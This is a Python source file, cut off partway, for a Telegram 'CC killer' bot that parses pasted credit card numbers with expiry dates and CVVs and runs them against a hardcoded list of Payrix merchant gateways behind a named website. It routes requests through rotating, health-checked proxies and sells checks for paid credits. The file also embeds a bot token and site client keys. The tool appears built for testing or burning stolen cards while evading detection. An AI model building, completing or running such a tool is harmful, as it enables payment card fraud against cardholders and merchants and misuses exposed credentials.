#!/usr/bin/env python3
# cc_killer_bot.py - Telegram Bot for Credit Card Transaction Cancellation
# Production-grade, Python 3.9+, pyTelegramBotAPI, SQLite-backed
# Features: Proxy rotation with authentication, dead/alive checking, ultra-modern UI/UX

import telebot
import requests
import json
import random
import time
import re
import string
import threading
import logging
import sqlite3
import sys
import os
import signal
import socket
import ipaddress
import base64
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, Dict, Any, List, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
from bs4 import BeautifulSoup
from urllib.parse import urlparse, quote, unquote
import hashlib
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# -----------------------------------------------------------------------------
# CONFIGURATION (HARD LIMITS, NO STUBS)
# -----------------------------------------------------------------------------
BOT_TOKEN = "8932146037:AAGSmnMhI4eUlnPYtk76SIJRt8obaAJh6NE"  # Replace with actual bot token
OWNER_ID = 5616232839  # Replace with actual Telegram ID

# Database path
DB_PATH = "cc_killer_bot.db"

# Banned BINs (first 6 digits)
BANNED_BINS = {
    "535563", "543446", "532610", "485340",
    "531106", "494116", "516929", "435880",
    "517608", "416549"
}

# Cost per kill check (credits deducted)
KILL_COST = 1

# Default credits for new users
DEFAULT_CREDITS = 0

# Thread pool size for parallel processing
MAX_WORKERS = 5

# Timeout values (seconds)
HTTP_TIMEOUT = 30
SOCKET_TIMEOUT = 10
PROXY_CHECK_TIMEOUT = 8
PROXY_ROTATION_INTERVAL = 60  # Seconds between proxy rotations

# Maximum proxies to store
MAX_PROXIES = 500

# -----------------------------------------------------------------------------
# LOGGING CONFIGURATION
# -----------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/var/log/cc_killer_bot.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('CC-Killer-Bot')

# -----------------------------------------------------------------------------
# SITE CONFIGURATION (Primary Gateway)
# -----------------------------------------------------------------------------
SITE_CONFIG = {
    "base_url": "https://outbermuda.org/",
    "form_id": "686",
    "referer_base": "https://outbermuda.org/",
    "auth_name": "43D8rvpNZ",
    "auth_client_key": "4yLL27sQ9HhzpHLr27sgfUY4kp894PydK6v24NadbnpX9L4m43Vm4UCX2dwn7D7U",
    "auth_id": "1dcaabea-fa2b-f4f8-631c-d335badfda3f"
}

# -----------------------------------------------------------------------------
# PAYMENT GATEWAYS (Payrix)
# -----------------------------------------------------------------------------
PAYMENT_GATEWAYS = [
    {"cid": "10334", "merchant": "p1_mer_66d212af800dc73de2ba7dd"},
    {"cid": "1071", "merchant": "p1_mer_669024d6e619d1ab217503d"},
    {"cid": "11488", "merchant": "p1_mer_66d2047bc7d50f8781e718d"},
    {"cid": "11607", "merchant": "p1_mer_669033821d7a054a353b357"},
    {"cid": "11674", "merchant": "p1_mer_6690210f7e21af07ed53a56"},
    {"cid": "1177", "merchant": "p1_mer_66902775744ddec5a326b9a"},
    {"cid": "1202", "merchant": "p1_mer_66d20c09f3a939e22ce38a9"},
    {"cid": "12196", "merchant": "p1_mer_66d20ae66feda63af8d82ee"},
    {"cid": "1230", "merchant": "p1_mer_6690282ba493094f251046a"},
    {"cid": "12465", "merchant": "p1_mer_669028b79fe1716a9dd8804"},
    {"cid": "13266", "merchant": "p1_mer_6690537c2d41ffed74ffecd"},
    {"cid": "13372", "merchant": "p1_mer_669028c9e4d4a6e3b893c56"},
    {"cid": "13429", "merchant": "p1_mer_66d207c90e53b855478fc36"},
    {"cid": "13430", "merchant": "p1_mer_66d20a5f65471c1e94aee92"},
    {"cid": "13440", "merchant": "p1_mer_66d2081286031a89b3c1b44"},
    {"cid": "14138", "merchant": "p1_mer_66d205f4ab29724cef8de2e"},
    {"cid": "14179", "merchant": "p1_mer_66d20c5d6d1a9d78a7d43d8"},
    {"cid": "14225", "merchant": "p1_mer_66902179c94ff0e03437c1b"},
    {"cid": "14245", "merchant": "p1_mer_66ad21126222709f81f0599"},
    {"cid": "14259", "merchant": "p1_mer_66d209fce9d93b9615955cd"},
    {"cid": "14322", "merchant": "p1_mer_66ad21126222709f81f0599"},
    {"cid": "14349", "merchant": "p1_mer_6690260d9668ca03eb24c41"},
    {"cid": "1454", "merchant": "p1_mer_66d20760b7fa378e43aef7e"},
    {"cid": "1467", "merchant": "p1_mer_6690252033ed0d624b8d076"},
    {"cid": "14692", "merchant": "p1_mer_66c778f4afcc3621c171e02"},
    {"cid": "14866", "merchant": "p1_mer_66d20c184d303299114bde7"},
    {"cid": "14884", "merchant": "p1_mer_66d20cf417b3b468afd637a"},
    {"cid": "14893", "merchant": "p1_mer_66902690e4d66dcc4a06fea"},
    {"cid": "14952", "merchant": "p1_mer_66d205f4ab29724cef8de2e"},
    {"cid": "15029", "merchant": "p1_mer_66d20ba6ea0b2bb826de94d"},
    {"cid": "15107", "merchant": "p1_mer_66d2055f509bf1982940ba3"},
    {"cid": "15508", "merchant": "p1_mer_669025e76463f87012fe294"},
    {"cid": "15523", "merchant": "p1_mer_66d20c26dd40ed50b6fa36e"},
    {"cid": "15630", "merchant": "p1_mer_6644eb51e726bbf463a4476"},
    {"cid": "15633", "merchant": "p1_mer_669025d4de98f58b3ba38ea"},
    {"cid": "15709", "merchant": "p1_mer_669021f7e934f033d1bc84f"},
    {"cid": "15724", "merchant": "p1_mer_669021f7e934f033d1bc84f"},
    {"cid": "15897", "merchant": "p1_mer_66d2129436ac351e493c45f"},
    {"cid": "15901", "merchant": "p1_mer_66d2129436ac351e493c45f"},
    {"cid": "15956", "merchant": "p1_mer_66e448ead64c11e731ca8e7"},
    {"cid": "15982", "merchant": "p1_mer_66e448ead64c11e731ca8e7"},
    {"cid": "16098", "merchant": "p1_mer_66d209372ccf9b98cc1803a"},
    {"cid": "16232", "merchant": "p1_mer_66d212882cab6f5bb130a07"},
    {"cid": "16285", "merchant": "p1_mer_66d2094580dfa382719e015"},
    {"cid": "16291", "merchant": "p1_mer_66902690e4d66dcc4a06fea"},
    {"cid": "16295", "merchant": "p1_mer_66d20859d77659a4b63fd21"},
    {"cid": "16305", "merchant": "p1_mer_669020fab671c86f50f51a8"},
    {"cid": "373", "merchant": "p1_mer_66902532a403c13c858d501"},
    {"cid": "4450", "merchant": "p1_mer_669023101de0f6105e4417d"},
    {"cid": "4942", "merchant": "p1_mer_66903c7408db001950fe873"},
    {"cid": "566", "merchant": "p1_mer_66d2068e8b8cbee7c075b2a"},
    {"cid": "6002", "merchant": "p1_mer_6690266e2b133b62945a047"},
    {"cid": "8722", "merchant": "p1_mer_66d206b7aed53de56673f94"},
]

# -----------------------------------------------------------------------------
# REGEX PATTERNS
# -----------------------------------------------------------------------------
CC_PATTERN = re.compile(
    r"(?:(?:[/!.#]kill|/check)\s+)?" +
    r"(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(?:20)?(\d{2})[|\s/:.-]+(\d{3,4})" +
    r"|" +
    r"(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(\d{4})[|\s/:.-]+(\d{3,4})" +
    r"|" +
    r"(\d{16})\D+?(\d{1,2})\D+?(\d{2,4})\D+?(\d{3,4})" +
    r"|" +
    r"(?:cc|card)[:\s]+(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(\d{2,4})[|\s/:.-]+(\d{3,4})" +
    r"|" +
    r"(?:card\s*number[:\s]*|cc[:\s]*)?(\d{4}[\s.-]?\d{4}[\s.-]?\d{4}[\s.-]?\d{4})[\s|/:.-]*(\d{1,2})[\s|/:.-]*(\d{2,4})[\s|/:.-]*(\d{3,4})" +
    r"|" +
    r"(\d{16})[\s]*exp[\s.-]*(\d{1,2})[\s/.-]*(\d{2,4})[\s]*cvv[\s]*(\d{3,4})" +
    r"|" +
    r"(\d{16})[\s]*(?:exp|expiry|expiration)[\s:.-]*(\d{1,2})/(\d{2,4})[\s]*(?:cvv|cvc|security)[\s:.-]*(\d{3,4})",
    re.IGNORECASE
)

# Proxy patterns with authentication support
PROXY_PATTERN = re.compile(
    r'(?:https?://)?'  # Optional protocol
    r'(?:([^:@]+)(?::([^@]+))?@)?'  # username:password@
    r'([a-zA-Z0-9.-]+)'  # host/IP
    r'(?::(\d{1,5}))?'  # :port
    r'(?:/([^/\s]+))?',  # optional path
    re.IGNORECASE
)

# Pattern for proxy with host:port:user:pass format
PROXY_AUTH_PATTERN = re.compile(
    r'^([a-zA-Z0-9.-]+):(\d{1,5}):([^:]+):(.+)$',
    re.IGNORECASE
)

# Pattern for proxy with @ format
PROXY_AT_PATTERN = re.compile(
    r'^(?:https?://)?(?:([^:@]+)(?::([^@]+))?@)?([a-zA-Z0-9.-]+):(\d{1,5})$',
    re.IGNORECASE
)

# Pattern for simple ip:port
PROXY_SIMPLE_PATTERN = re.compile(
    r'^([a-zA-Z0-9.-]+):(\d{1,5})$',
    re.IGNORECASE
)

# -----------------------------------------------------------------------------
# UI/UX - MODERN STYLING
# -----------------------------------------------------------------------------
class Styles:
    BORDER = "═══════════════════════════════════════"
    THIN_BORDER = "───────────────────────────────────────"
    BLOCK = "▣"
    DBLOCK = "◈"
    ARROW = "➜"
    STAR = "✦"
    BULLET = "▪"
    CHECK = "✅"
    CROSS = "❌"
    WARN = "⚠️"
    INFO = "ℹ️"
    LOCK = "🔒"
    UNLOCK = "🔓"
    CREDIT = "💰"
    CARD = "💳"
    FIRE = "🔥"
    SKULL = "💀"
    GEAR = "⚙️"
    PROXY = "🌐"
    CLOCK = "⏱️"
    STOPWATCH = "⏱️"
    BAR_CHART = "📊"
    USER = "👤"
    BAN = "⛔"
    SUCCESS = "✅"
    ERROR = "❌"
    WARNING = "⚠️"
    
    @staticmethod
    def header(title: str, icon: str = "⚡") -> str:
        return f"╔{Styles.BORDER}╗\n║ {icon}  {title}  {icon} ║\n╠{Styles.BORDER}╣"
    
    @staticmethod
    def footer() -> str:
        return f"╚{Styles.BORDER}╝"
    
    @staticmethod
    def progress_bar(percent: int, width: int = 30, filled: str = "█", empty: str = "░") -> str:
        filled_count = int(width * percent / 100)
        empty_count = width - filled_count
        return f"[{filled * filled_count}{empty * empty_count}] {percent}%"
    
    @staticmethod
    def box(content: List[str], title: str = "", icon: str = "▣") -> str:
        lines = []
        if title:
            lines.append(f"╔{Styles.BORDER}╗")
            lines.append(f"║ {icon} {title} ║")
            lines.append(f"╠{Styles.BORDER}╣")
        else:
            lines.append(f"┌{Styles.THIN_BORDER}┐")
        
        max_len = min(45, max(len(line) for line in content) if content else 30)
        for line in content:
            padded = line.ljust(max_len)
            if title:
                lines.append(f"║ {padded} ║")
            else:
                lines.append(f"│ {padded} │")
        
        if title:
            lines.append(f"╚{Styles.BORDER}╝")
        else:
            lines.append(f"└{Styles.THIN_BORDER}┘")
        
        return "\n".join(lines)

# -----------------------------------------------------------------------------
# PROXY MANAGER (AUTO-ROTATION, DEAD/ALIVE CHECKING, AUTH SUPPORT)
# -----------------------------------------------------------------------------
class ProxyManager:
    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._lock = threading.Lock()
        self._proxies: List[Dict[str, Any]] = []
        self._current_index = 0
        self._last_rotation = datetime.now()
        self._init_db()
        self._load_proxies()
        
    def _init_db(self):
        """Initialize proxy table in database."""
        conn = sqlite3.connect(self.db_path, check_same_thread=False)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                proxy_string TEXT UNIQUE,
                ip TEXT,
                port INTEGER,
                protocol TEXT,
                username TEXT,
                password TEXT,
                country TEXT,
                city TEXT,
                is_alive INTEGER DEFAULT 0,
                response_time REAL DEFAULT 0.0,
                last_checked TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                fail_count INTEGER DEFAULT 0,
                success_count INTEGER DEFAULT 0,
                added_by INTEGER DEFAULT 0,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        # Add indexes for performance
        c.execute('CREATE INDEX IF NOT EXISTS idx_proxy_alive ON proxies(is_alive)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_proxy_last_used ON proxies(last_used)')
        c.execute('CREATE UNIQUE INDEX IF NOT EXISTS idx_proxy_string ON proxies(proxy_string)')
        conn.commit()
        conn.close()
        logger.info("Proxy database initialized")
    
    def _load_proxies(self):
        """Load proxies from database into memory."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            c.execute('''
                SELECT id, proxy_string, ip, port, protocol, username, password,
                       country, city, is_alive, response_time, fail_count, success_count
                FROM proxies 
                WHERE is_alive = 1
                ORDER BY response_time ASC, success_count DESC
            ''')
            rows = c.fetchall()
            conn.close()
            
            self._proxies = []
            for row in rows:
                self._proxies.append({
                    'id': row[0],
                    'proxy_string': row[1],
                    'ip': row[2],
                    'port': row[3],
                    'protocol': row[4] or 'http',
                    'username': row[5] or '',
                    'password': row[6] or '',
                    'country': row[7] or 'Unknown',
                    'city': row[8] or 'Unknown',
                    'is_alive': row[9] == 1,
                    'response_time': row[10] or 0.0,
                    'fail_count': row[11] or 0,
                    'success_count': row[12] or 0
                })
            
            logger.info("Loaded %d alive proxies", len(self._proxies))
    
    def _parse_proxy_string(self, proxy_string: str) -> Optional[Dict[str, Any]]:
        """
        Parse proxy string with support for multiple formats:
        - ip:port
        - ip:port:username:password
        - username:password@ip:port
        - http://username:password@ip:port
        - hostname:port:username:password
        """
        ps = proxy_string.strip()
        if not ps:
            return None
        
        protocol = 'http'
        username = ''
        password = ''
        ip = ''
        port = 0
        
        # Remove protocol prefix
        if ps.startswith('http://'):
            protocol = 'http'
            ps = ps[7:]
        elif ps.startswith('https://'):
            protocol = 'https'
            ps = ps[8:]
        elif ps.startswith('socks5://'):
            protocol = 'socks5'
            ps = ps[9:]
        elif ps.startswith('socks4://'):
            protocol = 'socks4'
            ps = ps[9:]
        
        # Try format: ip:port:username:password (or host:port:user:pass)
        match = PROXY_AUTH_PATTERN.match(ps)
        if match:
            ip = match.group(1)
            port = int(match.group(2))
            username = match.group(3)
            password = match.group(4)
            return self._build_proxy_dict(ip, port, protocol, username, password, proxy_string)
        
        # Try format: username:password@ip:port
        match = PROXY_AT_PATTERN.match(ps)
        if match:
            username = match.group(1) or ''
            password = match.group(2) or ''
            ip = match.group(3)
            port = int(match.group(4))
            return self._build_proxy_dict(ip, port, protocol, username, password, proxy_string)
        
        # Try simple format: ip:port
        match = PROXY_SIMPLE_PATTERN.match(ps)
        if match:
            ip = match.group(1)
            port = int(match.group(2))
            return self._build_proxy_dict(ip, port, protocol, '', '', proxy_string)
        
        # Try generic pattern with optional auth
        match = PROXY_PATTERN.match(ps)
        if match:
            username = match.group(1) or ''
            password = match.group(2) or ''
            ip = match.group(3)
            port_str = match.group(4)
            if port_str:
                port = int(port_str)
            else:
                port = 8080  # Default port
            return self._build_proxy_dict(ip, port, protocol, username, password, proxy_string)
        
        return None
    
    def _build_proxy_dict(self, ip: str, port: int, protocol: str, username: str, 
                          password: str, original: str) -> Dict[str, Any]:
        """Build proxy dictionary from parsed components."""
        # Validate IP/host
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            # Try to resolve domain
            try:
                ip = socket.gethostbyname(ip)
            except socket.gaierror:
                # Keep hostname for DNS resolution at request time
                pass
        
        # Build proxy string for requests library
        if username and password:
            proxy_string = f"{protocol}://{username}:{password}@{ip}:{port}"
        else:
            proxy_string = f"{protocol}://{ip}:{port}"
        
        return {
            'proxy_string': proxy_string,
            'original': original,
            'ip': ip,
            'port': port,
            'protocol': protocol,
            'username': username,
            'password': password,
            'country': 'Unknown',
            'city': 'Unknown'
        }
    
    def _proxy_exists(self, proxy_string: str) -> bool:
        """Check if proxy exists in database."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT id FROM proxies WHERE proxy_string = ?', (proxy_string,))
            result = c.fetchone()
            conn.close()
            return result is not None
    
    def _check_single_proxy(self, proxy_string: str) -> bool:
        """
        Check if a single proxy is alive.
        Supports authenticated proxies.
        """
        try:
            parsed = self._parse_proxy_string(proxy_string)
            if not parsed:
                return False
            
            # Build proxy dict for requests
            proxy_dict = {
                'http': parsed['proxy_string'],
                'https': parsed['proxy_string']
            }
            
            # Test with multiple endpoints
            test_urls = [
                'https://httpbin.org/ip',
                'https://api.ipify.org?format=json',
                'http://ip-api.com/json'
            ]
            
            for url in test_urls:
                try:
                    response = requests.get(
                        url,
                        proxies=proxy_dict,
                        timeout=PROXY_CHECK_TIMEOUT,
                        verify=False
                    )
                    if response.status_code == 200:
                        # Verify we got a valid response
                        if 'ip' in response.text or response.text.strip():
                            return True
                except Exception:
                    continue
            
            # Fallback: socket test
            try:
                ip = parsed['ip']
                port = parsed['port']
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(PROXY_CHECK_TIMEOUT)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    return True
            except Exception:
                pass
            
            return False
            
        except Exception as e:
            logger.debug("Proxy check error for %s: %s", proxy_string[:30], str(e))
            return False
    
    def check_proxies(self, proxy_strings: List[str], progress_callback=None) -> List[bool]:
        """
        Check multiple proxies for aliveness with progress tracking.
        Supports authenticated proxies.
        """
        results = [False] * len(proxy_strings)
        completed = 0
        
        def check_with_progress(i, ps):
            nonlocal completed
            try:
                result = self._check_single_proxy(ps)
                results[i] = result
                completed += 1
                if progress_callback:
                    progress_callback(completed, len(proxy_strings))
                return result
            except Exception:
                results[i] = False
                completed += 1
                if progress_callback:
                    progress_callback(completed, len(proxy_strings))
                return False
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for i, ps in enumerate(proxy_strings):
                futures.append(executor.submit(check_with_progress, i, ps))
            
            for future in as_completed(futures):
                try:
                    future.result(timeout=PROXY_CHECK_TIMEOUT + 5)
                except Exception:
                    pass
        
        return results
    
    def add_proxies(self, proxy_strings: List[str], checker=None) -> Tuple[int, int, List[str], List[str]]:
        """
        Add proxies after checking them.
        Returns: (alive_count, dead_count, alive_proxies_list, dead_proxies_list)
        """
        alive_proxies = []
        dead_proxies = []
        parsed = []
        
        for ps in proxy_strings:
            ps = ps.strip()
            if not ps:
                continue
            
            # Parse proxy string
            parsed_proxy = self._parse_proxy_string(ps)
            if not parsed_proxy:
                dead_proxies.append(ps)
                continue
            
            # Check if already exists
            if self._proxy_exists(parsed_proxy['proxy_string']):
                # Update existing
                self._update_existing_proxy(parsed_proxy['proxy_string'], ps)
                continue
            
            parsed.append(parsed_proxy)
        
        if not parsed:
            return 0, len(dead_proxies), [], dead_proxies
        
        # Check proxies with progress
        proxy_list = [p['proxy_string'] for p in parsed]
        
        # Use provided checker or self
        if checker:
            # We'll use the checker's method if available, otherwise use our own
            check_method = getattr(checker, 'check_proxies', None)
            if check_method:
                checked = check_method(proxy_list)
                for i, (p, is_alive) in enumerate(zip(parsed, checked)):
                    p['is_alive'] = 1 if is_alive else 0
                    if is_alive:
                        alive_proxies.append(p['original'] or p['proxy_string'])
                    else:
                        dead_proxies.append(p['original'] or p['proxy_string'])
            else:
                # Fallback to our own check
                for p in parsed:
                    is_alive = self._check_single_proxy(p['proxy_string'])
                    p['is_alive'] = 1 if is_alive else 0
                    if is_alive:
                        alive_proxies.append(p['original'] or p['proxy_string'])
                    else:
                        dead_proxies.append(p['original'] or p['proxy_string'])
        else:
            # Use our own check
            for p in parsed:
                is_alive = self._check_single_proxy(p['proxy_string'])
                p['is_alive'] = 1 if is_alive else 0
                if is_alive:
                    alive_proxies.append(p['original'] or p['proxy_string'])
                else:
                    dead_proxies.append(p['original'] or p['proxy_string'])
        
        # Save to database
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            for p in parsed:
                try:
                    c.execute('''
                        INSERT OR REPLACE INTO proxies 
                        (proxy_string, ip, port, protocol, username, password, 
                         country, city, is_alive, response_time, last_checked)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        p['proxy_string'],
                        p['ip'],
                        p['port'],
                        p['protocol'],
                        p.get('username', ''),
                        p.get('password', ''),
                        p.get('country', 'Unknown'),
                        p.get('city', 'Unknown'),
                        1 if p.get('is_alive', 0) else 0,
                        0.0,
                        datetime.now().isoformat()
                    ))
                except sqlite3.IntegrityError:
                    pass  # Skip duplicates
            conn.commit()
            conn.close()
        
        # Reload proxies
        self._load_proxies()
        return len(alive_proxies), len(dead_proxies), alive_proxies, dead_proxies
    
    def _update_existing_proxy(self, proxy_string: str, original: str):
        """Update existing proxy's details if changed."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            c.execute('''
                UPDATE proxies 
                SET last_checked = ? 
                WHERE proxy_string = ?
            ''', (datetime.now().isoformat(), proxy_string))
            conn.commit()
            conn.close()
    
    def get_next_proxy(self) -> Optional[Dict[str, Any]]:
        """Get the next alive proxy (round-robin with rotation)."""
        with self._lock:
            if not self._proxies:
                return None
            
            # Rotate if interval has passed
            if (datetime.now() - self._last_rotation).seconds >= PROXY_ROTATION_INTERVAL:
                self._current_index = (self._current_index + 1) % len(self._proxies)
                self._last_rotation = datetime.now()
            
            # Try to find an alive proxy starting from current index
            attempts = 0
            while attempts < len(self._proxies):
                idx = (self._current_index + attempts) % len(self._proxies)
                proxy = self._proxies[idx]
                if proxy.get('is_alive', False):
                    self._current_index = (idx + 1) % len(self._proxies)
                    # Update last used
                    self._update_proxy_usage(proxy['id'])
                    return proxy
                attempts += 1
            
            # No alive proxies found
            return None
    
    def _update_proxy_usage(self, proxy_id: int):
        """Update last_used timestamp for a proxy."""
        try:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            c.execute('''
                UPDATE proxies 
                SET last_used = ?, success_count = success_count + 1
                WHERE id = ?
            ''', (datetime.now().isoformat(), proxy_id))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error("Failed to update proxy usage: %s", e)
    
    def mark_proxy_dead(self, proxy_string: str):
        """Mark a proxy as dead."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            c.execute('''
                UPDATE proxies 
                SET is_alive = 0, fail_count = fail_count + 1, last_checked = ?
                WHERE proxy_string = ?
            ''', (datetime.now().isoformat(), proxy_string))
            conn.commit()
            conn.close()
            
            # Remove from memory
            self._proxies = [p for p in self._proxies if p['proxy_string'] != proxy_string]
            logger.info("Marked proxy as dead: %s", proxy_string[:30])
    
    def get_stats(self) -> Dict[str, Any]:
        """Get proxy statistics."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            
            total = c.execute('SELECT COUNT(*) FROM proxies').fetchone()[0]
            alive = c.execute('SELECT COUNT(*) FROM proxies WHERE is_alive = 1').fetchone()[0]
            dead = total - alive
            auth_count = c.execute('SELECT COUNT(*) FROM proxies WHERE username != "" AND password != ""').fetchone()[0]
            
            avg_response = c.execute('SELECT AVG(response_time) FROM proxies WHERE is_alive = 1').fetchone()[0] or 0
            
            # Get top countries
            countries = c.execute('''
                SELECT country, COUNT(*) as count 
                FROM proxies 
                WHERE is_alive = 1 AND country != 'Unknown'
                GROUP BY country 
                ORDER BY count DESC 
                LIMIT 5
            ''').fetchall()
            
            conn.close()
            
            return {
                'total': total,
                'alive': alive,
                'dead': dead,
                'auth_count': auth_count,
                'avg_response': round(avg_response, 2),
                'top_countries': [{'country': c[0], 'count': c[1]} for c in countries]
            }
    
    def get_proxy_list(self, alive_only: bool = True, limit: int = 50) -> List[Dict[str, Any]]:
        """Get list of proxies with auth info."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            
            query = '''
                SELECT proxy_string, ip, port, protocol, username, password, 
                       country, is_alive, response_time, success_count, fail_count, last_checked
                FROM proxies
            '''
            params = []
            if alive_only:
                query += ' WHERE is_alive = 1'
            query += ' ORDER BY response_time ASC, success_count DESC LIMIT ?'
            params.append(limit)
            
            c.execute(query, params)
            rows = c.fetchall()
            conn.close()
            
            proxies = []
            for row in rows:
                has_auth = bool(row[4] and row[5])
                display = row[0]
                if has_auth:
                    # Mask password for display
                    masked = f"{row[4]}:****@{row[2]}:{row[3]}"
                else:
                    masked = f"{row[2]}:{row[3]}"
                    
                proxies.append({
                    'proxy_string': row[0],
                    'display': masked,
                    'ip': row[2],
                    'port': row[3],
                    'protocol': row[4] or 'http',
                    'username': row[5] or '',
                    'password': row[6] or '',
                    'has_auth': has_auth,
                    'country': row[7] or 'Unknown',
                    'is_alive': row[8] == 1,
                    'response_time': row[9] or 0.0,
                    'success_count': row[10] or 0,
                    'fail_count': row[11] or 0,
                    'last_checked': row[12]
                })
            return proxies
    
    def remove_proxy(self, proxy_string: str) -> bool:
        """Remove a proxy from the database."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            c.execute('DELETE FROM proxies WHERE proxy_string = ?', (proxy_string,))
            affected = c.rowcount
            conn.commit()
            conn.close()
            
            if affected > 0:
                self._proxies = [p for p in self._proxies if p['proxy_string'] != proxy_string]
                return True
            return False
    
    def clear_dead_proxies(self) -> int:
        """Remove all dead proxies from database."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            c.execute('DELETE FROM proxies WHERE is_alive = 0')
            affected = c.rowcount
            conn.commit()
            conn.close()
            
            self._load_proxies()
            return affected
    
    def get_proxy_by_string(self, proxy_string: str) -> Optional[Dict[str, Any]]:
        """Get proxy details by proxy string."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            c.execute('''
                SELECT id, proxy_string, ip, port, protocol, username, password, 
                       country, city, is_alive, response_time
                FROM proxies 
                WHERE proxy_string = ?
            ''', (proxy_string,))
            row = c.fetchone()
            conn.close()
            
            if row:
                return {
                    'id': row[0],
                    'proxy_string': row[1],
                    'ip': row[2],
                    'port': row[3],
                    'protocol': row[4],
                    'username': row[5],
                    'password': row[6],
                    'country': row[7],
                    'city': row[8],
                    'is_alive': row[9] == 1,
                    'response_time': row[10]
                }
            return None

# -----------------------------------------------------------------------------
# DATABASE HANDLER (THREAD-SAFE)
# -----------------------------------------------------------------------------
class Database:
    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._lock = threading.Lock()
        self._init_db()

    def _init_db(self):
        """Initialize database schema with all required tables."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            c.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    credits INTEGER DEFAULT 0,
                    is_banned INTEGER DEFAULT 0,
                    registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    total_checks INTEGER DEFAULT 0,
                    successful_kills INTEGER DEFAULT 0,
                    preferred_proxy TEXT DEFAULT ''
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS transactions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    card_number TEXT,
                    status TEXT,
                    gateway_result TEXT,
                    proxy_used TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (user_id)
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS admin_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    admin_id INTEGER,
                    action TEXT,
                    target_id INTEGER,
                    details TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            # Ensure columns exist (backwards compatibility)
            for col in ['credits', 'is_banned', 'registered_at', 'last_activity', 'total_checks', 'successful_kills', 'preferred_proxy']:
                try:
                    c.execute(f"ALTER TABLE users ADD COLUMN {col}")
                except sqlite3.OperationalError:
                    pass
            conn.commit()
            conn.close()
            logger.info("Database initialized at %s", self.db_path)

    def execute(self, query: str, params: tuple = ()) -> List[tuple]:
        """Execute a query and return results."""
        with self._lock:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            c = conn.cursor()
            c.execute(query, params)
            result = c.fetchall()
            conn.commit()
            conn.close()
            return result

    def get_user(self, user_id: int) -> Optional[Dict[str, Any]]:
        """Get user data as dict."""
        result = self.execute(
            "SELECT user_id, credits, is_banned, registered_at, last_activity, total_checks, successful_kills, preferred_proxy FROM users WHERE user_id = ?",
            (user_id,)
        )
        if result:
            return {
                "user_id": result[0][0],
                "credits": result[0][1],
                "is_banned": result[0][2],
                "registered_at": result[0][3],
                "last_activity": result[0][4],
                "total_checks": result[0][5] or 0,
                "successful_kills": result[0][6] or 0,
                "preferred_proxy": result[0][7] or ''
            }
        return None

    def create_user(self, user_id: int, credits: int = DEFAULT_CREDITS) -> bool:
        """Create a new user if not exists."""
        try:
            self.execute(
                "INSERT OR IGNORE INTO users (user_id, credits, is_banned) VALUES (?, ?, 0)",
                (user_id, credits)
            )
            return True
        except Exception as e:
            logger.error("Failed to create user %d: %s", user_id, e)
            return False

    def update_credits(self, user_id: int, delta: int) -> int:
        """Update credits by delta, return new balance."""
        self.execute(
            "UPDATE users SET credits = credits + ? WHERE user_id = ?",
            (delta, user_id)
        )
        result = self.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
        return result[0][0] if result else 0

    def get_credits(self, user_id: int) -> int:
        """Get current credit balance."""
